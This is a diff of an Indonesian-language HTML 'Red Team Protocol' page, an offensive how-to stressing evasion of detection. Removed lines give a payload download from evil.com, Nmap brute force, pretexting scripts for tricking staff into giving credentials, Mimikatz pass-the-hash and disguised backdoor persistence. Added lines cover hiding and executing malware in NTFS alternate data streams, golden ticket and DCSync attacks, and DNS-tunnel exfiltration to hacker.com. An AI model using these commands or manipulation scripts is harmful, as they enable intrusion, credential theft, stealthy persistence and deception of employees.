@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol: BREAKER (Red Team)</title>
+    <title>Protocol: BREAKER (GOD TIER)</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body class="breaker-theme">
 
@@ -13,105 +13,79 @@
     <div id="mySidebar" class="sidebar">
         <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
         <a href="index.html">00 // HOME</a>
-        <a href="#rtfm">04 // RTFM TACTICS</a>
-        <a href="#social">05 // SOCIAL ENGINEERING</a>
-        <a href="#warfare">06 // HACKER PLAYBOOK</a>
+        <a href="#stealth">04 // GHOST PROTOCOLS (STEALTH)</a>
+        <a href="#ad-kill">05 // ACTIVE DIRECTORY DESTRUCTION</a>
+        <a href="#exfil">06 // DATA EXFILTRATION</a>
         <a href="builder.html">>> SWITCH TO BUILDER</a>
     </div>
 
     <div class="container">
         <header>
             <h1>RED TEAM PROTOCOL</h1>
-            <p class="tagline">EXPLOITING LOGIC, INFRASTRUCTURE & HUMAN FLAWS</p>
+            <p class="tagline">OPERATIONS BEYOND DETECTION</p>
         </header>
 
-        <h2 id="rtfm" class="section-title">04 // Field Manual Tactics <span style="font-size:0.5em; opacity:0.6">Ref: RTFM</span></h2>
+        <h2 id="stealth" class="section-title">04 // Ghost Protocols</h2>
 
         <details>
-            <summary>POWERSHELL RECON (Living off the Land)</summary>
+            <summary>NTFS ALTERNATE DATA STREAMS (Hidden in Plain Sight)</summary>
             <div class="detail-content">
-                <p>Jangan download tool scan. Gunakan apa yang sudah ada di Windows.</p>
+                <p>Fitur Windows yang jarang diketahui. Satu file bisa punya banyak "laci" tersembunyi.</p>
                 <div class="sub-concept">
-                    <h3>Port Scan tanpa Nmap</h3>
-                    <pre><code>1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.5",$_)) "Port $_ is OPEN"} 2>$null</code></pre>
-                    <p>Script satu baris ini melakukan port scan TCP range 1-1024 menggunakan object .NET native. Tidak terdeteksi sebagai signature "Nmap".</p>
-                </div>
-                <div class="sub-concept">
-                    <h3>Download File tanpa Browser</h3>
-                    <pre><code>(New-Object System.Net.WebClient).DownloadFile("http://evil.com/payload.exe", "C:\Temp\payload.exe")</code></pre>
+                    <h3>Cara Menyembunyikan File .EXE di dalam .TXT</h3>
+                    <pre><code>type malware.exe > laporan.txt:rahasia.exe</code></pre>
+                    <p>Jika Anda cek <code>laporan.txt</code>, ukurannya normal. Isinya teks biasa. Tapi ada stream tersembunyi bernama <code>rahasia.exe</code> yang menempel.</p>
+                    <p><strong>Cara Execute:</strong> <code>wmic process call create C:\laporan.txt:rahasia.exe</code></p>
+                    <p>Admin biasa tidak akan pernah menemukannya lewat Windows Explorer.</p>
                 </div>
             </div>
         </details>
 
         <details>
-            <summary>NMAP ADVANCED (Beyond Basics)</summary>
+            <summary>FILELESS MALWARE (Reflective DLL Injection)</summary>
             <div class="detail-content">
-                <p>Semua orang tahu <code>-sS</code>. Tapi pemenang menggunakan NSE (Nmap Scripting Engine).</p>
-                <pre><code># Deteksi Vulnerability (Mirip Nessus mini)
-nmap -Pn --script vuln 192.168.1.5
-
-# Brute Force Telnet (Hati-hati berisik!)
-nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pwds.txt 192.168.1.5</code></pre>
-                <div class="warning-box">Gunakan flag <code>-T1</code> (Timing: Sneaky) jika ingin menghindari deteksi IDS/IPS. Scan akan sangat lama tapi stealthy.</div>
+                <p>Malware jadul naruh file di Harddisk -> Terdeteksi Antivirus. Malware dewa hidup di RAM.</p>
+                <p>Teknik: Load DLL langsung dari memori tanpa pernah menyentuh disk (Write to Disk = Detected). Menggunakan PowerShell untuk memanggil API Windows <code>VirtualAlloc</code> dan <code>CreateThread</code> secara manual.</p>
             </div>
         </details>
 
-        <h2 id="social" class="section-title">05 // Art of Deception <span style="font-size:0.5em; opacity:0.6">Ref: Kevin Mitnick</span></h2>
+        <h2 id="ad-kill" class="section-title">05 // Active Directory Kill Chain</h2>
 
         <details>
-            <summary>PRETEXTING & PSYCHOLOGY</summary>
+            <summary>GOLDEN TICKET ATTACK (God Mode)</summary>
             <div class="detail-content">
-                <div class="sub-concept">
-                    <h3>Teknik "Technical Jargon" (Otoritas)</h3>
-                    <p>Orang cenderung patuh pada teknisi yang terdengar ahli. Jangan bilang "Boleh minta password?".</p>
-                    <p><strong>Katakan:</strong> "Bu, sinkronisasi LDAP di node 4 gagal karena token autentikasi ibu corrupt. Saya perlu mereset kredensial sesi agar Ibu bisa login besok. Tolong bacakan kode di layar." (Korban bingung -> Percaya -> Memberi data).</p>
-                </div>
-                <div class="sub-concept">
-                    <h3>Reciprocity (Timbal Balik)</h3>
-                    <p>Berikan sesuatu dulu (bantuan kecil, file pdf, tips), baru minta sesuatu. Manusia diprogram biologis untuk membalas budi.</p>
-                </div>
+                <p>Jika Anda berhasil mencuri hash akun <strong>krbtgt</strong> (Kerberos Ticket Granting Ticket), game over.</p>
+                <p>Anda bisa membuat "Golden Ticket" palsu. Tiket ini:</p>
+                <ul>
+                    <li>Berlaku 10 tahun (atau selamanya).</li>
+                    <li>Bisa menyamar jadi user SIAPA SAJA (termasuk Enterprise Admin).</li>
+                    <li>Tetap valid walau password user asli diganti.</li>
+                </ul>
+                <div class="code-block">mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-xx /krbtgt:HASH /id:500</div>
             </div>
         </details>
 
         <details>
-            <summary>THE REVERSE STING (Sepuh Level)</summary>
+            <summary>DCSync (Pura-pura jadi Domain Controller)</summary>
             <div class="detail-content">
-                <p>Teknik manipulasi tingkat dewa dimana TARGET yang menghubungi ANDA.</p>
-                <ol>
-                    <li>Sabotase ringan akses mereka (misal: cabut kabel LAN di ruang meeting atau jamming sinyal WiFi).</li>
-                    <li>Tinggalkan kartu nama "Helpdesk Support Darurat" di meja.</li>
-                    <li>Tunggu mereka panik dan menelepon Anda.</li>
-                    <li>Sekarang Anda adalah PENYELAMAT. Mereka akan memberikan akses apa saja yang Anda minta untuk memperbaiki masalah tersebut.</li>
-                </ol>
+                <p>Memanfaatkan protokol replikasi Windows. Hacker meminta DC asli untuk "Replikasi Data" (sinkronisasi password hash) ke komputer hacker.</p>
+                <p>Tidak perlu login ke server, tidak perlu tanam malware. Cukup punya hak akses replikasi, dan tarik semua password hash satu perusahaan.</p>
             </div>
         </details>
 
-        <h2 id="warfare" class="section-title">06 // Advanced Warfare <span style="font-size:0.5em; opacity:0.6">Ref: Hacker Playbook 3</span></h2>
+        <h2 id="exfil" class="section-title">06 // Data Exfiltration</h2>
 
         <details>
-            <summary>LATERAL MOVEMENT (Pass The Hash)</summary>
+            <summary>DNS TUNNELING (Bypass Firewall)</summary>
             <div class="detail-content">
-                <p>Anda dapat hash password admin tapi tidak bisa crack (terlalu rumit)? Jangan dicrack. Pakai saja hash-nya.</p>
+                <p>Firewall memblokir port 80 (HTTP), 21 (FTP), 22 (SSH). Tapi jarang memblokir port 53 (DNS) karena internet butuh DNS.</p>
                 <div class="sub-concept">
-                    <h3>Mimikatz</h3>
-                    <pre><code>sekurlsa::pth /user:Administrator /domain:TARGETDOMAIN /ntlm:b4b9b02e6f09a9bd760f388b67351e2b</code></pre>
-                    <p>Perintah ini membuka CMD baru yang diautentikasi sebagai Admin menggunakan hash NTLM, tanpa perlu tahu password aslinya.</p>
-                </div>
-            </div>
-        </details>
-
-        <details>
-            <summary>PERSISTENCE (Supaya Tidak Diusir)</summary>
-            <div class="detail-content">
-                <p>Setelah masuk, pastikan Anda bisa kembali walau komputer direstart.</p>
-                <div class="sub-concept">
-                    <h3>Registry Run Keys</h3>
-                    <pre><code>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f</code></pre>
-                </div>
-                <div class="sub-concept">
-                    <h3>Scheduled Tasks (Lebih Stealth)</h3>
-                    <pre><code>schtasks /create /sc minute /mo 30 /tn "Windows Update Assistant" /tr "powershell.exe -WindowStyle hidden -File C:\temp\shell.ps1"</code></pre>
-                    <p>Ini akan menjalankan backdoor setiap 30 menit dengan nama yang terlihat resmi.</p>
+                    <h3>Logika Serangan</h3>
+                    <p>Anda ingin mengirim data rahasia "PASSWORD123".</p>
+                    <p>1. Encode jadi Base64 -> "UEFTU1dPUkQxMjM".<br>
+                    2. Lakukan DNS Query ke domain milik hacker: <code>ping UEFTU1dPUkQxMjM.hacker.com</code><br>
+                    3. Server hacker menerima query tersebut, dan mencatat sub-domainnya. Data berhasil dicuri lewat protokol DNS.</p>
+                    <p>Sangat lambat, tapi hampir mustahil dihentikan tanpa Deep Packet Inspection.</p>
                 </div>
             </div>
         </details>
